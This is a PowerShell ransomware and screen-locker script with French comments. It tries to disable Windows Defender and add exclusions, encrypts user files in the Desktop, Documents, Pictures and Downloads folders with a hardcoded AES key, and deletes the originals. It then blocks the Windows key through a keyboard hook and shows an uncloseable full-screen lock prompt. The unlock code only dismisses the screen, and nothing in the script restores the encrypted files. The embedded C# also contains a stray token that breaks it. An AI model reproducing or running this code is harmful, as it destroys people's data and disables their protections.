# lock.ps1
$ErrorActionPreference = 'SilentlyContinue'

# Tentative exclusion Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $env:TEMP, $env:USERPROFILE -ErrorAction SilentlyContinue
} catch {}

Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Security

# Clé AES
$k = [Text.Encoding]::UTF8.GetBytes('05121005121005121005121005121005')
$i = [Text.Encoding]::UTF8.GetBytes('0512100512100512')

function Encrypt-File($path) {
    try {
        $bytes = [IO.File]::ReadAllBytes($path)
        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Key = $k
        $aes.IV = $i
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $encrypted = $aes.CreateEncryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
        [IO.File]::WriteAllBytes("$path.locked", $encrypted)
        Remove-Item $path -Force
    } catch {}
}

# Chiffrement
$dirs = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Downloads"
)

foreach ($dir in $dirs) {
    Get-ChildItem $dir -Recurse -File -Include *.jpg,*.png,*.jpeg,*.pdf,*.docx,*.xlsx,*.txt,*.mp4,*.mp3,*.zip -ErrorAction SilentlyContinue |
        ForEach-Object { Encrypt-File $_.FullName }
}

# Blocage touche Windows (low-level hook)
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class WinBlock {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int VK_LWIN = 0x5B;
    private const int VK_RWIN = 0x5C;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Start() { _hookID = SetHook(_proc); }
    public static void Stop()  { UnhookWindowsHookEx(_hookID); }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) subs {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == VK_LWIN || vkCode == VK_RWIN) return (IntPtr)1;
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

[WinBlock]::Start()

# Boucle de verrouillage
while ($true) {
    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.ControlBox = $false
    $form.ShowInTaskbar = $false
    $form.KeyPreview = $true
    $form.Add_FormClosing({ param($s, $e) $e.Cancel = $true })

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "SYSTEM LOCKED`r`n`r`nPC INUTILISABLE`r`n`r`nEntrez le code"
    $label.Font = New-Object System.Drawing.Font('Consolas', 26, [System.Drawing.FontStyle]::Bold)
    $label.ForeColor = 'Red'
    $label.BackColor = 'Black'
    $label.TextAlign = 'MiddleCenter'
    $label.Dock = 'Fill'

    $textbox = New-Object System.Windows.Forms.TextBox
    $textbox.Font = New-Object System.Drawing.Font('Consolas', 22)
    $textbox.Size = New-Object System.Drawing.Size(300, 45)
    $textbox.MaxLength = 6
    $textbox.PasswordChar = '*'
    $textbox.BackColor = 'Black'
    $textbox.ForeColor = 'Lime'
    $textbox.BorderStyle = 'FixedSingle'
    $textbox.TextAlign = 'Center'

    $button = New-Object System.Windows.Forms.Button
    $button.Text = 'DEBLOQUER'
    $button.Font = New-Object System.Drawing.Font('Consolas', 14, [System.Drawing.FontStyle]::Bold)
    $button.Size = New-Object System.Drawing.Size(180, 45)
    $button.BackColor = 'DarkRed'
    $button.ForeColor = 'White'
    $button.FlatStyle = 'Flat'

    $button.Add_Click({
        if ($textbox.Text -eq '051210') {
            [WinBlock]::Stop()
            Get-Process explorer -ErrorAction SilentlyContinue | Stop-Process -Force
            Start-Process explorer
            $form.Close()
            exit
        } else {
            $textbox.Clear()
            $label.Text = "MAUVAIS CODE`r`n`r`nReessayez"
        }
    })

    $form.Controls.AddRange(@($label, $textbox, $button))

    $form.Add_Shown({
        $textbox.Location = New-Object System.Drawing.Point(
            [int](($form.ClientSize.Width - 300) / 2),
            [int]($form.ClientSize.Height * 0.58)
        )
        $button.Location = New-Object System.Drawing.Point(
            [int](($form.ClientSize.Width - 180) / 2),
            [int]($form.ClientSize.Height * 0.68)
        )
        $textbox.BringToFront()
        $button.BringToFront()
        $textbox.Focus()
    })

    [System.Windows.Forms.Application]::Run($form)
}